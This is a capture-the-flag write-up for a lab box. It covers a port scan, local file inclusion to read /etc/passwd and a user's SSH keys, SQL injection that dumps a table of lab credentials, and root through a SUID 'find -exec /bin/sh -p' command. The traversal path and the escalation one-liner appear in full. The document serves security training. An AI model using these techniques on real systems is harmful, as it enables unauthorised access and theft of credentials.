# "Richie" Writeup

Initial Recon

Namp

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Caddy httpd
8080/tcp open  http        Apache httpd 2.4.38 ((Debian))
```

Nothing massively obvious (except the FINC / SQLi) in the web pages so far

## File Includes

So we have the File includes in the main website. (In the http://127.0.0.1/index.php?page=PAYLOAD)
part.

Do the standard

  - Log files are not there but thats standard docker stuff
  - We get the /etc/passwd  which gives us a *john* user
  

## Database

There is also SQL injection on the 8080 service.

Mangle my enumeration script to get some creds (see script)

User            | Password
------------------------------
omae_wa_mou     | shindeiru
Rick_Astley     | NeverGonnaGiveYouUp
Richie          | Cooldude
John            | 6R5t768y7E654uyg
Isthis          | anSQLserver?
Hey             | ImJustMatthew
Harry           | IamaWizzard!
Evan            | Bestteammateever!
Dan             | Isalegend
Cool_Guy        | Neverseenexplosions
Baby            | Shark
Adam            | Isalegend2



## Trying Creds

 - Creds from the DB are not working with SSH
 - Logins all work on the page but dont give me anything interesting.  Dammit


## Back to Finc

 - As a Guess lets try to grab the user flag with FINC
 
Ok Thats interesting: http://127.0.0.1/index.php?page=../../../../../../home/john/user.txt

```
TODO: - Learn PHP and MySQL [IN PROGRESS] - Setup an SSH server [DONE] - Generate my SSH keys [DONE]
```

Take a look in the .ssh directory, and we find the keys... Awesome sauce,  
Quick and dirty script to grab them


## Ssh and User

cuehack{did_the_name_mislead_you?}


## Root

No Sudo

Check for SUID and get the win.

```
john@70037aabe340:~$ find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/find
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
john@70037aabe340:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@70037aabe340:~$ ./find . -exec /bin/sh -p \; -quit
bash: ./find: No such file or directory
john@70037aabe340:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)



# cat /root/root.txt
cuehack{so_you_found_it}# 
```
